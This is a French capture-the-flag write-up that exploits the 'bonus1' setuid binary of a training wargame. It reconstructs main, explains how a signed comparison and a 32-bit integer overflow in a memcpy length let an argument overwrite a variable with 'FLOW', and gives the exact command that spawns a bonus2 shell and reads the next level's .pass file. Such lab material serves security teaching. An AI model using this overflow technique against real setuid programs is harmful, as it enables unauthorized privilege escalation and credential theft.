# bonus1

## Démarche

1. **Reconnaissance**

   **Permissions / SUID.**

   ```bash
   ls -l
   -rwsr-s---+ 1 bonus2 users 5043 Mar  6 2016 bonus1
        ^
        bit setuid
   ```

   Le binaire appartient a `bonus2` et porte le bit **setuid** : un shell ouvert
   par l'executable tourne avec les droits de `bonus2`, ce qui permet de lire
   `/home/user/bonus2/.pass`.

   **Analyse.** Lecture du desassemblage de `main` :

   ```c
   int main(int argc, char *argv[])
   {
       int  a = atoi(argv[1]);   // esp+0x3c
       char buffer[40];          // esp+0x14

       if (a <= 9) {
           memcpy(buffer, argv[2], a * 4);
           if (a == 0x574f4c46)        // "FLOW"
               execl("/bin/sh", "/bin/sh", NULL);
       } else
           return 1;
       return 0;
   }
   ```

   Points cles reperes dans l'asm :
   - `a` = `atoi(argv[1])`, stocke a `esp+0x3c`
   - `buffer` a `esp+0x14` -> ecart `0x3c - 0x14 = 0x28 = 40` octets entre buffer et `a`
   - `cmpl $0x9 ; jle` -> test **signe** `a <= 9`
   - `memcpy(buffer, argv[2], a*4)` -> taille = `a * 4`
   - `cmpl $0x574f4c46` -> `a` compare a "FLOW" (`46 4c 4f 57` en little-endian = F L O W)

2. **Faille**

   Contradiction apparente : `a` doit etre `<= 9` (1er if) **et** valoir
   `0x574f4c46` (2e if). Impossible... sauf si `a` **change entre les deux tests**.

   Le `memcpy` est la cle : il copie `a*4` octets dans `buffer`, et `a` se trouve
   seulement 40 octets apres `buffer`. En copiant 44 octets, on **ecrase `a`**
   avec le contenu de argv[2].

   Deux obstacles a contourner :

   - **`a <= 9` (signe)** : un nombre **negatif** passe le test.
   - **`a * 4` doit valoir 44** (40 de padding + 4 pour "FLOW"), pas un nombre
     geant (sinon memcpy copie des milliards d'octets -> segfault).

   On exploite l'**overflow entier** de `a * 4` sur 32 bits :

   ```
   a * 4 ≡ 44  (mod 2^32)
   a = (44 - 2^32) / 4 = -1073741813
   ```

   Verification :
   - `a = -1073741813` -> negatif -> passe `a <= 9`
   - `a * 4 = -4294967252` -> sur 32 bits (wrap-around) = **44** 

   memcpy copie donc exactement 44 octets : 40 de padding + "FLOW", ce dernier
   ecrasant `a`. Au 2e if, `a == 0x574f4c46` -> `execl("/bin/sh")`.

3. **Contournement / implémentation**

   - argv[1] = `-1073741813` (atoi -> a negatif, a*4 = 44)
   - argv[2] = 40 octets de padding + `FLOW`

   ```bash
   ./bonus1 -1073741813 "$(printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW')"
   ```
      ```bash
       cat /home/user/bonus2/.pass
   ```